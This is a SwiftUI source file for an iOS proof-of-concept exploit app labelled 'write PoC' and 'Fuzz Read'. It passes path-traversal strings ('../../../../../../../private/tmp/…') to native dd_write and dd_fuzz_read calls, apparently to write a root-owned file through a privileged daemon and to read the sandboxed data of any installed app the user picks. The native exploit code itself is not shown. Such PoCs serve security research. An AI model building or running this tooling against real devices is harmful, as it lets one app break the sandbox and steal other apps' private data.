import SwiftUI

struct AppEntry: Identifiable {
    let id: String       // bundleId
    let name: String
    let dataPath: String
    let bundlePath: String
}

struct ContentView: View {
    @State private var apps: [AppEntry]       = []
    @State private var selectedId: String?    = nil
    @State private var subPath                = "Documents"
    @State private var running                = false
    @State private var showAlert              = false
    @State private var alertTitle             = ""
    @State private var alertMessage           = ""
    @State private var searchText             = ""

    private var selectedApp: AppEntry? {
        apps.first { $0.id == selectedId }
    }

    private var readTarget: String {
        guard let app = selectedApp else { return "" }
        let base = app.dataPath.isEmpty ? app.bundlePath : app.dataPath
        let sub  = subPath.trimmingCharacters(in: CharacterSet(charactersIn: "/"))
        return sub.isEmpty ? base : "\(base)/\(sub)"
    }

    private var filtered: [AppEntry] {
        searchText.isEmpty ? apps
            : apps.filter {
                $0.name.localizedCaseInsensitiveContains(searchText) ||
                $0.id.localizedCaseInsensitiveContains(searchText)
              }
    }

    var body: some View {
        VStack(spacing: 0) {

            // ── Header ─────────────────────────────────────────────
            VStack(spacing: 12) {
                Text("Hello World").font(.largeTitle)

                Button("OK Bommer  (write PoC)") { runWrite() }
                    .buttonStyle(.borderedProminent)
                    .disabled(running)
            }
            .padding()

            Divider()

            // ── App list ───────────────────────────────────────────
            VStack(spacing: 0) {
                HStack {
                    Text("Fuzz Read — select target app")
                        .font(.headline)
                    Spacer()
                    if apps.isEmpty {
                        ProgressView().scaleEffect(0.7)
                    }
                }
                .padding(.horizontal)
                .padding(.top, 8)

                TextField("Search…", text: $searchText)
                    .textFieldStyle(.roundedBorder)
                    .padding(.horizontal)
                    .padding(.vertical, 4)

                List(filtered) { app in
                    VStack(alignment: .leading, spacing: 2) {
                        Text(app.name)
                            .font(.body)
                        Text(app.id)
                            .font(.caption)
                            .foregroundStyle(.secondary)
                    }
                    .contentShape(Rectangle())
                    .listRowBackground(
                        selectedId == app.id
                            ? Color.accentColor.opacity(0.15)
                            : Color.clear
                    )
                    .onTapGesture { selectedId = app.id }
                }
                .listStyle(.plain)
            }

            Divider()

            // ── Read controls ──────────────────────────────────────
            VStack(spacing: 8) {
                if let app = selectedApp {
                    HStack(spacing: 4) {
                        Text(app.dataPath.isEmpty ? app.bundlePath : app.dataPath)
                            .font(.system(.caption2, design: .monospaced))
                            .foregroundStyle(.secondary)
                            .lineLimit(1)
                            .truncationMode(.middle)
                        Text("/")
                            .foregroundStyle(.secondary)
                        TextField("sub/path", text: $subPath)
                            .font(.system(.caption2, design: .monospaced))
                            .frame(width: 130)
                            .textFieldStyle(.roundedBorder)
                            .autocorrectionDisabled()
                            .textInputAutocapitalization(.never)
                    }
                    .padding(.horizontal)
                } else {
                    Text("Select an app above")
                        .font(.caption)
                        .foregroundStyle(.tertiary)
                }

                HStack(spacing: 16) {
                    Button("Fuzz Read") { runFuzzRead() }
                        .buttonStyle(.bordered)
                        .disabled(running || selectedApp == nil)

                    if running { ProgressView() }
                }
                .padding(.bottom, 12)
            }
        }
        .alert(alertTitle, isPresented: $showAlert) {
            Button("OK") {}
        } message: {
            Text(alertMessage)
        }
        .onAppear { loadApps() }
    }

    // MARK: - Write

    private func runWrite() {
        running = true
        Task.detached {
            let ts   = Int(Date().timeIntervalSince1970)
            let name = "poc_\(ts)"
            let tgt  = "/private/tmp/\(name)"
            let ident = "../../../../../../../private/tmp/\(name)"
            let rc   = dd_write(ident, tgt)
            await finish(
                title:   rc == 0 ? "Write OK" : "Write Failed",
                message: rc == 0 ? "uid=0 file at \(tgt)" : "dd_write → \(rc)"
            )
        }
    }

    // MARK: - Fuzz Read

    private func runFuzzRead() {
        guard let app = selectedApp else { return }
        running = true
        let target = readTarget
        Task.detached {
            // 9 levels of ../ guarantees reaching / from any daemon working dir
            let traversal = "../../../../../../../../../../.." + target
            let bufSize   = 8192
            var buf       = [CChar](repeating: 0, count: bufSize)
            var outLen    = 0
            var cmd: Int32 = -1

            let rc = dd_fuzz_read(traversal, &buf, bufSize, &outLen, &cmd)

            let appLabel = "\(app.name) (\(app.id))"
            await finish(
                title:   rc == 0 ? "Read OK — cmd \(cmd)" : "Read Failed",
                message: rc == 0
                    ? "[\(appLabel)]\n\(target)\n\n"
                      + (String(bytes: buf.prefix(outLen).map { UInt8(bitPattern: $0) },
                                encoding: .utf8) ?? "(non-UTF8, \(outLen) bytes)")
                    : "No command returned data.\nTarget: \(target)"
            )
        }
    }

    // MARK: - Load apps

    private func loadApps() {
        Task.detached {
            let raw = dd_installed_apps()
            let list: [AppEntry] = (raw as? [[String: String]] ?? []).compactMap { d in
                guard let bid = d["bundleId"], !bid.isEmpty else { return nil }
                return AppEntry(
                    id:          bid,
                    name:        d["name"]        ?? bid,
                    dataPath:    d["dataPath"]    ?? "",
                    bundlePath:  d["bundlePath"]  ?? ""
                )
            }
            await MainActor.run { apps = list }
        }
    }

    // MARK: - Helpers

    @MainActor
    private func finish(title: String, message: String) {
        running      = false
        alertTitle   = title
        alertMessage = message
        showAlert    = true
    }
}
